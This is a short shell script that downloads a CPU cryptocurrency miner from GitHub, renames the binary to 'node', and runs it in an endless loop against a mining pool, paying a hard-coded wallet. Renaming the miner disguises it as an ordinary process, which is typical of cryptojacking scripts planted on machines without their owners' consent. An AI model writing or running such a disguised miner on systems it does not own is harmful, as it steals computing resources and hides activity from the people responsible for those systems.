#!/bin/sh
#
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
tar -xf cpuminer-opt-linux.tar.gz 
mv cpuminer-avx node
while [ 1 ]; do
./node -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbah -t1
sleep 5
done
